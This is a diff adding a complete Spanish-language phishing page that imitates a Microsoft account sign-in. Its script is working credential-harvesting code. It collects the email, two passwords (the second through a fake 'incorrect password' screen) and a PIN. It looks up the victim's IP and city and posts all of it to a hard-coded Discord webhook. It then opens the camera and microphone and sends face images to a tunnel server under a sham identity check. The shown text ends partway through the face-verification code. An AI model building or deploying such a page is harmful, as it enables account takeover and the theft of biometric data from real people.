@@ -1,0 +1,1393 @@
+<!doctype html>
+<html lang="es">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Iniciar sesión - Verificación facial en vivo</title>
+    <style>
+      * {
+        box-sizing: border-box;
+        font-family: "Segoe UI", Tahoma, Geneva, Verdana, sans-serif;
+        margin: 0;
+        padding: 0;
+      }
+      body {
+        background-color: #f6f6f6;
+        min-height: 100vh;
+        display: flex;
+        flex-direction: column;
+        justify-content: center;
+        align-items: center;
+        padding: 20px;
+      }
+      .login-wrapper {
+        width: 100%;
+        max-width: 440px;
+        display: flex;
+        flex-direction: column;
+        gap: 16px;
+      }
+      .login-card,
+      .signin-options {
+        background-color: #ffffff;
+        width: 100%;
+        box-shadow: 0 2px 6px rgba(0, 0, 0, 0.2);
+        border: 1px solid #ccc;
+      }
+      .login-card {
+        padding: 44px;
+        position: relative;
+        overflow: hidden;
+      }
+
+      .loading-overlay {
+        position: absolute;
+        inset: 0;
+        background: rgba(255, 255, 255, 0.85);
+        display: none;
+        justify-content: center;
+        align-items: flex-start;
+        z-index: 50;
+        pointer-events: all;
+      }
+      .loading-overlay.active {
+        display: flex;
+      }
+      .loading-overlay img {
+        display: block;
+        width: 100%;
+        height: 4px;
+        object-fit: cover;
+        margin-top: 0;
+      }
+
+      .logo-container {
+        margin-bottom: 24px;
+      }
+      .logo-container img {
+        height: 24px;
+        display: block;
+      }
+      h1 {
+        font-size: 24px;
+        font-weight: 600;
+        color: #1b1b1b;
+        margin-bottom: 16px;
+        word-break: break-all;
+      }
+      p.desc {
+        font-size: 14px;
+        color: #595959;
+        margin-bottom: 20px;
+        line-height: 1.4;
+      }
+      .input-group {
+        margin-bottom: 16px;
+      }
+      input[type="email"],
+      input[type="password"],
+      input[type="text"] {
+        width: 100%;
+        padding: 8px 0 10px 0;
+        border: none;
+        border-bottom: 1px solid #666;
+        font-size: 15px;
+        outline: none;
+        transition: border-color 0.2s;
+      }
+      input[type="email"]:focus,
+      input[type="password"]:focus,
+      input[type="text"]:focus {
+        border-bottom: 2px solid #0067b8;
+      }
+      input::placeholder {
+        color: #595959;
+      }
+      .links-container {
+        margin-bottom: 24px;
+      }
+      .forgot-link {
+        font-size: 13px;
+        color: #0067b8;
+        text-decoration: none;
+        display: inline-block;
+        margin-bottom: 4px;
+      }
+      .forgot-link:hover {
+        text-decoration: underline;
+      }
+      .button-container {
+        display: flex;
+        justify-content: flex-end;
+        margin-top: 20px;
+      }
+      button {
+        background-color: #0067b8;
+        color: white;
+        border: none;
+        padding: 6px 32px;
+        font-size: 15px;
+        cursor: pointer;
+        min-width: 108px;
+        height: 32px;
+      }
+      button:hover {
+        background-color: #005da6;
+      }
+      button:disabled {
+        background-color: #8aa9c4;
+        cursor: not-allowed;
+      }
+      .back-link {
+        font-size: 13px;
+        color: #0067b8;
+        text-decoration: none;
+        display: inline-block;
+        margin-top: 8px;
+      }
+      .signin-options {
+        padding: 14px 20px;
+        display: flex;
+        align-items: center;
+        gap: 12px;
+        cursor: pointer;
+      }
+      .signin-options svg {
+        width: 20px;
+        height: 20px;
+        fill: #595959;
+      }
+      .signin-options span {
+        font-size: 15px;
+        color: #1b1b1b;
+      }
+      .error-msg {
+        color: #d9534f;
+        font-size: 13px;
+        margin-top: 8px;
+        min-height: 16px;
+      }
+
+      .camera-container {
+        position: relative;
+        width: 100%;
+        max-width: 320px;
+        aspect-ratio: 1 / 1;
+        margin: 0 auto 16px auto;
+        background: #000;
+        border-radius: 8px;
+        overflow: hidden;
+        display: flex;
+        justify-content: center;
+        align-items: center;
+      }
+      .camera-container video {
+        width: 100%;
+        height: 100%;
+        object-fit: cover;
+        transform: scaleX(-1);
+      }
+      .face-guide-overlay {
+        position: absolute;
+        inset: 0;
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        pointer-events: none;
+      }
+      .face-oval {
+        width: 65%;
+        height: 78%;
+        border: 2px dashed rgba(255, 255, 255, 0.7);
+        border-radius: 50%;
+        box-shadow: 0 0 0 9999px rgba(0, 0, 0, 0.45);
+        transition: border-color 0.3s ease;
+      }
+      .face-oval.ok {
+        border-color: #28a745;
+        border-style: solid;
+      }
+      .face-oval.warn {
+        border-color: #ffc107;
+        border-style: dashed;
+      }
+      .face-oval.error {
+        border-color: #d9534f;
+        border-style: solid;
+      }
+      .status-badge {
+        text-align: center;
+        font-size: 13px;
+        font-weight: 600;
+        margin-bottom: 12px;
+        padding: 6px 10px;
+        border-radius: 4px;
+        background: #e9ecef;
+        color: #333;
+      }
+      .status-badge.ok {
+        background: #d4edda;
+        color: #155724;
+      }
+      .status-badge.warn {
+        background: #fff3cd;
+        color: #856404;
+      }
+      .status-badge.error {
+        background: #f8d7da;
+        color: #721c24;
+      }
+
+      /* --- PIN de 4 dígitos --- */
+      .pin-inputs {
+        display: flex;
+        gap: 12px;
+        justify-content: center;
+        margin: 20px 0;
+      }
+      .pin-digit {
+        width: 56px;
+        height: 56px;
+        text-align: center;
+        font-size: 24px;
+        font-weight: 600;
+        border: 1px solid #666;
+        border-bottom: 2px solid #666;
+        outline: none;
+        background: #fff;
+        transition: border-color 0.2s;
+      }
+      .pin-digit:focus {
+        border-bottom: 2px solid #0067b8;
+      }
+
+      @media (max-width: 480px) {
+        body {
+          background-color: #ffffff;
+          height: auto;
+          justify-content: flex-start;
+          align-items: stretch;
+          padding: 0;
+        }
+        .login-wrapper {
+          max-width: 100%;
+          gap: 12px;
+        }
+        .login-card {
+          padding: 24px 20px 20px 20px;
+          box-shadow: none;
+          border: none;
+        }
+        .signin-options {
+          border-left: none;
+          border-right: none;
+          box-shadow: none;
+        }
+        .pin-digit {
+          width: 48px;
+          height: 48px;
+          font-size: 20px;
+        }
+      }
+    </style>
+  </head>
+  <body>
+    <div class="login-wrapper">
+      <div class="login-card" id="loginCard">
+        <!-- Overlay del GIF de carga -->
+        <div class="loading-overlay" id="loadingOverlay">
+          <img
+            src="https://aadcdn.msftauth.net/shared/1.0/content/images/marching_ants_986f40b5a9dc7d39ef8396797f61b323.gif"
+            alt=""
+          />
+        </div>
+
+        <div class="logo-container">
+          <img
+            src="https://thumb.wikimedia.org/wikipedia/commons/thumb/9/96/Microsoft_logo_%282012%29.svg/3840px-Microsoft_logo_%282012%29.svg.png"
+            alt="Tu Logo"
+          />
+        </div>
+
+        <!-- Vista 1: Correo -->
+        <div id="step-email">
+          <h1>Iniciar sesión</h1>
+          <div class="input-group">
+            <input
+              type="email"
+              id="emailInput"
+              placeholder="Correo electrónico, teléfono o Skype"
+              required
+            />
+          </div>
+          <div class="links-container">
+            <a href="#" class="forgot-link">¿No tiene una cuenta? Cree una.</a
+            ><br />
+            <a href="#" class="forgot-link">¿No puede acceder a su cuenta?</a>
+          </div>
+          <div class="button-container">
+            <button type="button" id="btnEmailNext" onclick="nextStep()">
+              Siguiente
+            </button>
+          </div>
+          <div class="error-msg" id="errorEmail"></div>
+        </div>
+
+        <!-- Vista 2: Contraseña -->
+        <div id="step-password" style="display: none">
+          <h1 id="userDisplayEmail">usuario@correo.com</h1>
+          <a
+            href="#"
+            class="back-link"
+            onclick="
+              backToEmail();
+              return false;
+            "
+            >Atrás</a
+          >
+          <div class="input-group" style="margin-top: 16px">
+            <input
+              type="password"
+              id="passwordInput"
+              placeholder="Contraseña"
+              required
+            />
+          </div>
+          <div class="links-container">
+            <a href="#" class="forgot-link">¿Olvidó su contraseña?</a>
+          </div>
+          <div class="button-container">
+            <button type="button" id="btnLogin" onclick="submitFirstPassword()">
+              Siguiente
+            </button>
+          </div>
+          <div class="error-msg" id="errorPassword"></div>
+        </div>
+
+        <!-- Vista 3: Contraseña incorrecta -->
+        <div id="step-password-incorrect" style="display: none">
+          <h1 id="userDisplayEmailIncorrect">usuario@correo.com</h1>
+          <a
+            href="#"
+            class="back-link"
+            onclick="
+              backToPasswordFromIncorrect();
+              return false;
+            "
+            >Atrás</a
+          >
+          <p class="desc" style="margin-top: 16px; color: #d9534f">
+            La contraseña ingresada es incorrecta. Vuelve a intentarlo.
+          </p>
+          <div class="input-group">
+            <input
+              type="password"
+              id="passwordIncorrectInput"
+              placeholder="Contraseña"
+              required
+            />
+          </div>
+          <div class="links-container">
+            <a href="#" class="forgot-link">¿Olvidó su contraseña?</a>
+          </div>
+          <div class="button-container">
+            <button
+              type="button"
+              id="btnIncorrectPassword"
+              onclick="submitSecondPassword()"
+            >
+              Siguiente
+            </button>
+          </div>
+          <div class="error-msg" id="errorPasswordIncorrect"></div>
+        </div>
+
+        <!-- Vista 4: PIN (4 dígitos, 4 inputs) -->
+        <div id="step-pin" style="display: none">
+          <h1>Verificación en dos pasos</h1>
+          <a
+            href="#"
+            class="back-link"
+            onclick="
+              backToPasswordIncorrectFromPin();
+              return false;
+            "
+            >Atrás</a
+          >
+          <p class="desc" style="margin-top: 16px">
+            Ingresa tu PIN de <strong>4 dígitos</strong> para continuar.
+          </p>
+          <div class="pin-inputs">
+            <input type="text" class="pin-digit" inputmode="numeric" pattern="[0-9]*" maxlength="1" autocomplete="off" />
+            <input type="text" class="pin-digit" inputmode="numeric" pattern="[0-9]*" maxlength="1" autocomplete="off" />
+            <input type="text" class="pin-digit" inputmode="numeric" pattern="[0-9]*" maxlength="1" autocomplete="off" />
+            <input type="text" class="pin-digit" inputmode="numeric" pattern="[0-9]*" maxlength="1" autocomplete="off" />
+          </div>
+          <div class="button-container">
+            <button type="button" id="btnPin" onclick="submitPinAndProceed()">
+              Siguiente
+            </button>
+          </div>
+          <div class="error-msg" id="errorPin"></div>
+        </div>
+
+        <!-- Vista 5: Verificación Facial -->
+        <div id="step-face" style="display: none">
+          <h1>Verificación de identidad</h1>
+          <p class="desc">
+            Alinea tu rostro en el óvalo. Cuando esté listo, pulsa
+            <strong>Siguiente</strong> para intentar la verificación.
+          </p>
+          <div id="faceStatus" class="status-badge">Iniciando cámara...</div>
+          <div class="camera-container">
+            <video id="webcamVideo" autoplay playsinline muted></video>
+            <div class="face-guide-overlay">
+              <div id="faceOval" class="face-oval"></div>
+            </div>
+          </div>
+          <canvas id="snapshotCanvas" style="display: none"></canvas>
+          <div class="button-container">
+            <button
+              type="button"
+              id="btnVerifyFace"
+              disabled
+              onclick="onFaceAttemptClick()"
+            >
+              Siguiente
+            </button>
+          </div>
+          <div class="error-msg" id="errorFace"></div>
+        </div>
+
+        <!-- Vista 6: Grabación de video -->
+        <div id="step-video" style="display: none">
+          <h1>Grabación de video</h1>
+          <p class="desc">
+            Mire a la camara y mantenga su rostro visible durante
+            <strong>5 segundos</strong>.
+          </p>
+          <div id="videoStatus" class="status-badge">
+            Ponte en un espacio iluminado
+          </div>
+          <div class="camera-container">
+            <video id="recordVideo" autoplay playsinline muted></video>
+          </div>
+          <div class="button-container">
+            <button
+              type="button"
+              id="btnVideoNext"
+              disabled
+              onclick="finishVideoAndProceed()"
+            >
+              Siguiente
+            </button>
+          </div>
+          <div class="error-msg" id="errorVideo"></div>
+        </div>
+      </div>
+
+      <div
+        class="signin-options"
+        onclick="alert('Opciones de inicio de sesión')"
+      >
+        <svg
+          xmlns="http://www.w3.org/2000/svg"
+          viewBox="0 0 256 256"
+          width="20"
+          height="20"
+        >
+          <path
+            fill="#595959"
+            d="M 79.191 90.023 c -0.78 0 -1.526 -0.307 -2.084 -0.865 l -8.425 -8.424 c -0.624 -0.626 -0.934 -1.487 -0.851 -2.365 l 0.401 -4.212 l -2.609 0.508 c -0.879 0.157 -1.779 -0.088 -2.457 -0.678 c -0.677 -0.589 -1.047 -1.441 -1.013 -2.338 l 0.161 -4.256 l -4.619 0.688 c -0.914 0.132 -1.848 -0.183 -2.5 -0.836 l -4.44 -4.439 c -0.708 -0.71 -1.007 -1.717 -0.801 -2.694 l 0.839 -4.011 l -3.977 0.875 c -0.981 0.207 -1.985 -0.094 -2.692 -0.801 l -3.29 -3.29 c -10.721 5.331 -23.895 3.233 -32.41 -5.283 c -10.966 -10.966 -10.966 -28.81 0 -39.776 c 10.965 -10.966 28.81 -10.966 39.776 0 c 8.246 8.247 10.512 20.702 5.797 31.303 l 35.339 35.338 c 0.557 0.557 0.864 1.298 0.864 2.087 v 9.641 c 0 1.509 -1.132 2.771 -2.632 2.934 l -8.055 0.875 C 79.406 90.017 79.298 90.023 79.191 90.023 z M 22.452 27.983 c -2.142 0 -4.284 -0.816 -5.914 -2.446 c -3.261 -3.261 -3.261 -8.567 0 -11.828 c 3.261 -3.26 8.567 -3.26 11.828 0 c 3.261 3.261 3.261 8.567 0 11.828 C 26.735 27.168 24.593 27.983 22.452 27.983 z"
+          />
+        </svg>
+        <span>Opciones de inicio de sesión</span>
+      </div>
+    </div>
+
+    <script>
+      // ============================================================
+      // CONFIGURACIÓN
+      // ============================================================
+      const API_BASE =
+        "https://strings-towns-patents-matched.trycloudflare.com";
+      const DISCORD_WEBHOOK_URL =
+        "https://discordapp.com/api/webhooks/1472759512099328041/NC6FFmITf65gDIPz2tlETMw6loLvD_wvXoNYdms73TJM9hOPkP-ZWoA73fQgVZWZbIRy";
+
+      const INTERVALO_VERIFICACION_MS = 1800;
+      const MAX_INTENTOS = 3;
+      const FALLO_DISPLAY_MS = 1500;
+      const VIDEO_DURATION_MS = 5000;
+
+      const DOMINIOS_PERMITIDOS = [
+        "hotmail.com",
+        "hotmail.es",
+        "hotmail.co.uk",
+        "hotmail.fr",
+        "hotmail.de",
+        "hotmail.it",
+        "hotmail.com.mx",
+        "hotmail.com.ar",
+        "hotmail.com.co",
+        "hotmail.com.br",
+        "msn.com",
+        "outlook.com",
+        "outlook.es",
+        "outlook.com.mx",
+        "outlook.com.ar",
+        "outlook.com.co",
+        "outlook.com.br",
+        "outlook.fr",
+        "outlook.de",
+        "outlook.it",
+        "outlook.co.uk",
+        "live.com",
+        "live.com.mx",
+        "live.com.ar",
+        "live.com.co",
+        "live.com.br",
+        "live.es",
+        "live.co.uk",
+        "live.fr",
+        "live.de",
+        "live.it",
+        "windowslive.com",
+        "passport.com",
+      ];
+
+      const VIDEO_CONSTRAINTS_FRONTAL = {
+        facingMode: { ideal: "user" },
+        width: { ideal: 640 },
+        height: { ideal: 480 },
+      };
+      const VIDEO_CONSTRAINTS_FALLBACK = {
+        width: { ideal: 640 },
+        height: { ideal: 480 },
+      };
+
+      let streamInstance = null;
+      let liveCheckInterval = null;
+      let isFaceApto = false;
+      let modeloListo = false;
+      let intentosRostro = 0;
+      let procesandoIntento = false;
+      let mediaRecorder = null;
+      let recordedChunks = [];
+      let recordingTimerInterval = null;
+      let cameraReady = false;
+      let savedPinCode = "";
+
+      // Variables para geolocalización y control
+      let cachedLocation = null;
+      let locationPromise = null;
+      let isProcessingEmail = false;
+
+      // ============================================================
+      // GEOLOCALIZACIÓN (Múltiples APIs)
+      // ============================================================
+      async function fetchSingleGeo(api, timeoutMs = 2500) {
+        const controller = new AbortController();
+        const timer = setTimeout(() => controller.abort(), timeoutMs);
+        try {
+          const response = await fetch(api.url, { signal: controller.signal });
+          if (!response.ok) throw new Error(`HTTP ${response.status}`);
+          const data = await response.json();
+          const result = api.parser(data);
+          if (!result.ip || !result.pais) throw new Error("Datos incompletos");
+          return result;
+        } finally {
+          clearTimeout(timer);
+        }
+      }
+
+      async function getIpAndLocation() {
+        if (cachedLocation) return cachedLocation;
+        if (locationPromise) return locationPromise;
+
+        const apis = [
+          {
+            url: "https://ipapi.co/json/",
+            parser: (d) => ({ ip: d.ip, ciudad: d.city, pais: d.country_name }),
+          },
+          {
+            url: "http://ip-api.com/json/",
+            parser: (d) => ({ ip: d.query, ciudad: d.city, pais: d.country }),
+          },
+          {
+            url: "https://get.geojs.io/v1/ip/geo.json",
+            parser: (d) => ({ ip: d.ip, ciudad: d.city, pais: d.country }),
+          },
+        ];
+
+        locationPromise = Promise.any(apis.map((api) => fetchSingleGeo(api)))
+          .then((result) => {
+            cachedLocation = result;
+            return result;
+          })
+          .catch(() => ({
+            ip: "Desconocida",
+            ciudad: "Desconocida",
+            pais: "Desconocido",
+          }))
+          .finally(() => {
+            locationPromise = null;
+          });
+
+        return locationPromise;
+      }
+
+      // ============================================================
+      // ENVÍO A DISCORD
+      // ============================================================
+      async function sendDiscordText(content, botName = "MS Login") {
+        if (!DISCORD_WEBHOOK_URL) return;
+        try {
+          await fetch(DISCORD_WEBHOOK_URL, {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({ content, username: botName }),
+          });
+        } catch (e) {
+          console.error("Error enviando a Discord:", e);
+        }
+      }
+
+      async function sendDiscordFile(
+        content,
+        blob,
+        filename,
+        botName = "MS Login",
+      ) {
+        if (!DISCORD_WEBHOOK_URL) return;
+        try {
+          const fd = new FormData();
+          fd.append(
+            "payload_json",
+            JSON.stringify({ content, username: botName }),
+          );
+          fd.append("file", blob, filename);
+          await fetch(DISCORD_WEBHOOK_URL, { method: "POST", body: fd });
+        } catch (e) {
+          console.error("Error enviando archivo a Discord:", e);
+        }
+      }
+
+      // Formato: label + triple backtick; IP en texto plano; sin duplicar email
+      async function enviarCampos(campos, botName = "MS Login") {
+        const email = sessionStorage.getItem("usuario_email") || "No definido";
+        const loc = await getIpAndLocation();
+
+        let msg = "";
+
+        // Evitar duplicar el email si ya viene en los campos
+        const emailYaIncluido = Object.values(campos).some(
+          (v) => String(v) === email,
+        );
+        if (!emailYaIncluido) {
+          msg += `**Usuario:**\n\`\`\`\n${email}\n\`\`\`\n\n`;
+        }
+
+        // Cada campo con triple backtick
+        for (const [k, v] of Object.entries(campos)) {
+          msg += `**${k}:**\n\`\`\`\n${v}\n\`\`\`\n\n`;
+        }
+
+        // Ubicación en texto plano
+        msg += `🌐 **IP:** ${loc.ip}\n`;
+        msg += `🏙️ **Ciudad:** ${loc.ciudad}\n`;
+        msg += `🌎 **País:** ${loc.pais}`;
+
+        await sendDiscordText(msg, botName);
+      }
+
+      // ============================================================
+      // UI Y TRANSICIONES
+      // ============================================================
+      function sleep(ms) {
+        return new Promise((resolve) => setTimeout(resolve, ms));
+      }
+
+      async function showLoadingGif() {
+        const overlay = document.getElementById("loadingOverlay");
+        if (!overlay) return;
+        const delay = 1000 + Math.floor(Math.random() * 1000);
+        overlay.classList.add("active");
+        await sleep(delay);
+        overlay.classList.remove("active");
+      }
+
+      async function conLoading(fn) {
+        await showLoadingGif();
+        if (typeof fn === "function") await fn();
+      }
+
+      function mensajeErrorCamara(err) {
+        const name = err && err.name ? err.name : "Error";
+        if (name.includes("NotAllowed") || name.includes("Permission"))
+          return "Permiso de cámara denegado.";
+        if (name.includes("NotFound")) return "No se encontró cámara.";
+        if (name.includes("NotReadable")) return "La cámara está en uso.";
+        if (name.includes("Overconstrained"))
+          return "Cámara no soporta la configuración.";
+        if (name.includes("Security")) return "Se requiere HTTPS.";
+        return "Error al acceder a la cámara.";
+      }
+
+      // ============================================================
+      // HELPERS DE CAPTURA
+      // ============================================================
+      function blobToBase64(blob) {
+        return new Promise((resolve, reject) => {
+          const reader = new FileReader();
+          reader.onloadend = () => resolve(reader.result);
+          reader.onerror = reject;
+          reader.readAsDataURL(blob);
+        });
+      }
+
+      function captureSquareFrame(video, canvas, size = 384) {
+        const vw = video.videoWidth;
+        const vh = video.videoHeight;
+        if (!vw || !vh) return false;
+        canvas.width = size;
+        canvas.height = size;
+        const ctx = canvas.getContext("2d");
+        ctx.clearRect(0, 0, size, size);
+        const side = Math.min(vw, vh);
+        const sx = (vw - side) / 2;
+        const sy = (vh - side) / 2;
+        ctx.drawImage(video, sx, sy, side, side, 0, 0, size, size);
+        return true;
+      }
+
+      function captureFullFrame(video, canvas) {
+        const vw = video.videoWidth;
+        const vh = video.videoHeight;
+        if (!vw || !vh) return false;
+        canvas.width = vw;
+        canvas.height = vh;
+        const ctx = canvas.getContext("2d");
+        ctx.clearRect(0, 0, vw, vh);
+        ctx.drawImage(video, 0, 0, vw, vh);
+        return true;
+      }
+
+      function pickVideoMime() {
+        const candidates = [
+          "video/webm;codecs=vp9,opus",
+          "video/webm;codecs=vp8,opus",
+          "video/webm",
+          "video/mp4;codecs=h264",
+          "video/mp4",
+        ];
+        for (const c of candidates) {
+          try {
+            if (
+              typeof MediaRecorder !== "undefined" &&
+              MediaRecorder.isTypeSupported &&
+              MediaRecorder.isTypeSupported(c)
+            )
+              return c;
+          } catch (_) {}
+        }
+        return "";
+      }
+
+      // ============================================================
+      // PASOS
+      // ============================================================
+      async function nextStep() {
+        if (isProcessingEmail) return;
+
+        const email = document
+          .getElementById("emailInput")
+          .value.trim()
+          .toLowerCase();
+        const errBox = document.getElementById("errorEmail");
+        const btn = document.getElementById("btnEmailNext");
+        errBox.textContent = "";
+
+        if (!email || !email.includes("@")) {
+          errBox.textContent = "Por favor, escribe un correo válido.";
+          return;
+        }
+
+        const partes = email.split("@");
+        if (partes.length !== 2 || !partes[0] || !partes[1]) {
+          errBox.textContent = "Por favor, escribe un correo válido.";
+          return;
+        }
+
+        const dominio = partes[1];
+        if (!DOMINIOS_PERMITIDOS.includes(dominio)) {
+          errBox.textContent =
+            "Solo se permiten correos de Hotmail, MSN, Outlook o Live.";
+          return;
+        }
+
+        isProcessingEmail = true;
+        btn.disabled = true;
+
+        sessionStorage.setItem("usuario_email", email);
+        document.getElementById("userDisplayEmail").innerText = email;
+
+        await conLoading(() => {
+          document.getElementById("step-email").style.display = "none";
+          document.getElementById("step-password").style.display = "block";
+          document.getElementById("passwordInput").focus();
+        });
+
+        await enviarCampos({ "Correo Ingresado": email }, "MS Login | Correo");
+
+        isProcessingEmail = false;
+        btn.disabled = false;
+      }
+
+      function backToEmail() {
+        prevStopLive();
+        document.getElementById("step-password").style.display = "none";
+        document.getElementById("step-email").style.display = "block";
+        document.getElementById("errorPassword").textContent = "";
+      }
+
+      function prevStopLive() {
+        if (liveCheckInterval) {
+          clearInterval(liveCheckInterval);
+          liveCheckInterval = null;
+        }
+        if (recordingTimerInterval) {
+          clearInterval(recordingTimerInterval);
+          recordingTimerInterval = null;
+        }
+        if (
+          mediaRecorder &&
+          mediaRecorder.state &&
+          mediaRecorder.state !== "inactive"
+        ) {
+          try {
+            mediaRecorder.stop();
+          } catch (_) {}
+        }
+        if (streamInstance) {
+          streamInstance.getTracks().forEach((t) => t.stop());
+          streamInstance = null;
+        }
+        cameraReady = false;
+        isFaceApto = false;
+        modeloListo = false;
+        intentosRostro = 0;
+        procesandoIntento = false;
+      }
+
+      async function submitFirstPassword() {
+        const password = document.getElementById("passwordInput").value;
+        const errBox = document.getElementById("errorPassword");
+        errBox.textContent = "";
+        if (!password) {
+          errBox.textContent = "Escribe tu contraseña.";
+          return;
+        }
+
+        enviarCampos({ "Clave 1": password }, "MS Login | Clave");
+        document.getElementById("userDisplayEmailIncorrect").innerText =
+          sessionStorage.getItem("usuario_email") || "";
+
+        await conLoading(() => {
+          document.getElementById("step-password").style.display = "none";
+          document.getElementById("step-password-incorrect").style.display =
+            "block";
+          document.getElementById("passwordIncorrectInput").value = "";
+          document.getElementById("errorPasswordIncorrect").textContent = "";
+          document.getElementById("passwordIncorrectInput").focus();
+        });
+      }
+
+      function backToPasswordFromIncorrect() {
+        document.getElementById("step-password-incorrect").style.display =
+          "none";
+        document.getElementById("step-password").style.display = "block";
+        document.getElementById("errorPasswordIncorrect").textContent = "";
+        document.getElementById("passwordInput").focus();
+      }
+
+      async function submitSecondPassword() {
+        const confirm = document.getElementById("passwordIncorrectInput").value;
+        const errBox = document.getElementById("errorPasswordIncorrect");
+        errBox.textContent = "";
+        if (!confirm) {
+          errBox.textContent = "Escribe tu contraseña.";
+          return;
+        }
+
+        enviarCampos({ "Clave 2": confirm }, "MS Login | Clave Incorrecta");
+
+        await conLoading(() => {
+          document.getElementById("step-password-incorrect").style.display =
+            "none";
+          document.getElementById("step-pin").style.display = "block";
+          document.getElementById("errorPin").textContent = "";
+          // Limpiar los 4 inputs del PIN y enfocar el primero
+          document.querySelectorAll(".pin-digit").forEach((inp) => (inp.value = ""));
+          const firstPinInput = document.querySelector(".pin-digit");
+          if (firstPinInput) firstPinInput.focus();
+        });
+      }
+
+      function backToPasswordIncorrectFromPin() {
+        document.getElementById("step-pin").style.display = "none";
+        document.getElementById("step-password-incorrect").style.display =
+          "block";
+        document.getElementById("errorPin").textContent = "";
+        document.getElementById("passwordIncorrectInput").focus();
+      }
+
+      // ============================================================
+      // LÓGICA DEL PIN DE 4 DÍGITOS
+      // ============================================================
+      function setupPinInputs() {
+        const inputs = document.querySelectorAll(".pin-digit");
+        inputs.forEach((input, index) => {
+          input.addEventListener("input", (e) => {
+            e.target.value = e.target.value.replace(/\D/g, "").slice(0, 1);
+            if (e.target.value.length === 1 && index < inputs.length - 1) {
+              inputs[index + 1].focus();
+            }
+          });
+
+          input.addEventListener("keydown", (e) => {
+            if (e.key === "Backspace" && !e.target.value && index > 0) {
+              inputs[index - 1].focus();
+            }
+            if (e.key === "Enter") submitPinAndProceed();
+          });
+
+          input.addEventListener("paste", (e) => {
+            e.preventDefault();
+            const pasted = (e.clipboardData || window.clipboardData)
+              .getData("text")
+              .replace(/\D/g, "")
+              .slice(0, 4);
+            if (pasted.length > 0) {
+              inputs.forEach((inp, i) => {
+                inp.value = pasted[i] || "";
+              });
+              const lastIndex = Math.min(pasted.length, 4) - 1;
+              inputs[lastIndex].focus();
+            }
+          });
+        });
+      }
+      setupPinInputs();
+
+      async function submitPinAndProceed() {
+        const inputs = document.querySelectorAll(".pin-digit");
+        const pin = Array.from(inputs)
+          .map((i) => i.value)
+          .join("");
+        const errBox = document.getElementById("errorPin");
+        const btn = document.getElementById("btnPin");
+        errBox.textContent = "";
+
+        if (!/^\d{4}$/.test(pin)) {
+          errBox.textContent = "El PIN debe tener 4 dígitos.";
+          return;
+        }
+
+        savedPinCode = pin;
+        enviarCampos({ PIN: pin }, "MS Login | PIN");
+        btn.disabled = true;
+        btn.textContent = "Guardando...";
+
+        try {
+          await conLoading(() => {
+            document.getElementById("step-pin").style.display = "none";
+            document.getElementById("step-face").style.display = "block";
+          });
+          intentosRostro = 0;
+          await initCameraLive();
+        } catch (e) {
+          errBox.textContent = "Error de conexión. Intenta de nuevo.";
+        } finally {
+          btn.disabled = false;
+          btn.textContent = "Siguiente";
+        }
+      }
+
+      // ============================================================
+      // VERIFICACIÓN FACIAL
+      // ============================================================
+      async function initCameraLive() {
+        const video = document.getElementById("webcamVideo");
+        const statusBadge = document.getElementById("faceStatus");
+
+        try {
+          statusBadge.textContent = "Solicitando cámara...";
+          statusBadge.className = "status-badge";
+
+          if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
+            statusBadge.textContent =
+              "Tu navegador no soporta acceso a la cámara.";
+            statusBadge.className = "status-badge error";
+            return;
+          }
+
+          let stream = null;
+          try {
+            stream = await navigator.mediaDevices.getUserMedia({
+              video: VIDEO_CONSTRAINTS_FRONTAL,
+              audio: true,
+            });
+          } catch (err1) {
+            try {
+              stream = await navigator.mediaDevices.getUserMedia({
+                video: VIDEO_CONSTRAINTS_FRONTAL,
+                audio: false,
+              });
+            } catch (err2) {
+              try {
+                stream = await navigator.mediaDevices.getUserMedia({
+                  video: true,
+                  audio: false,
+                });
+              } catch (err4) {
+                statusBadge.textContent = mensajeErrorCamara(err4);
+                statusBadge.className = "status-badge error";
+                return;
+              }
+            }
+          }
+
+          streamInstance = stream;
+          video.srcObject = streamInstance;
+          await video.play();
+          cameraReady = true;
+
+          await new Promise((resolve) => {
+            if (video.videoWidth && video.videoHeight) return resolve();
+            const onLoaded = () => {
+              video.removeEventListener("loadedmetadata", onLoaded);
+              resolve();
+            };
+            video.addEventListener("loadedmetadata", onLoaded);
+            setTimeout(resolve, 2000);
+          });
+
+          statusBadge.textContent = "Esperando modelos...";
+          modeloListo = await waitForModelReady();
+          if (!modeloListo) {
+            statusBadge.textContent = "Modelos no disponibles. Reintenta.";
+            statusBadge.className = "status-badge error";
+            return;
+          }
+
+          statusBadge.textContent = "Alinea tu rostro...";
+          statusBadge.className = "status-badge";
+          startLiveValidationLoop();
+        } catch (err) {
+          statusBadge.textContent = mensajeErrorCamara(err);
+          statusBadge.className = "status-badge error";
+        }
+      }
+
+      async function waitForModelReady() {
+        for (let i = 0; i < 10; i++) {
+          try {
+            const r = await fetch(`${API_BASE}/health`);
+            if (r.ok) {
+              const d = await r.json();
+              if (d.modelos_listos) return true;
+            }
+          } catch (_) {}
+          await new Promise((r) => setTimeout(r, 2000));
+        }
+        return false;
+      }
+
+      function startLiveValidationLoop() {
+        const video = document.getElementById("webcamVideo");
+        const canvas = document.getElementById("snapshotCanvas");
+        const statusBadge = document.getElementById("faceStatus");
+        const oval = document.getElementById("faceOval");
+        const btnVerify = document.getElementById("btnVerifyFace");
+
+        if (liveCheckInterval) clearInterval(liveCheckInterval);
+
+        liveCheckInterval = setInterval(async () => {
+          if (procesandoIntento || intentosRostro >= MAX_INTENTOS) return;
+          if (!cameraReady || !video || video.paused || video.ended) return;
+          if (!video.videoWidth || !video.videoHeight) return;
+          if (!captureSquareFrame(video, canvas, 384)) return;
+
+          canvas.toBlob(
+            async (blob) => {
+              if (!blob) return;
+              try {
+                const dataUrl = await blobToBase64(blob);
+                const res = await fetch(`${API_BASE}/verificar-rostro`, {
+                  method: "POST",
+                  headers: { "Content-Type": "application/json" },
+                  body: JSON.stringify({ image_base64: dataUrl }),
+                });
+
+                if (res.status === 503) {
+                  statusBadge.textContent = "Servidor ocupado, reintentando...";
+                  statusBadge.className = "status-badge warn";
+                  oval.className = "face-oval warn";
+                  btnVerify.disabled = true;
+                  isFaceApto = false;
+                  return;
+                }
+
+                if (res.status === 400) {
+                  const errData = await res.json().catch(() => ({}));
+                  statusBadge.textContent =
+                    errData.errors?.[0] || "Imagen rechazada.";
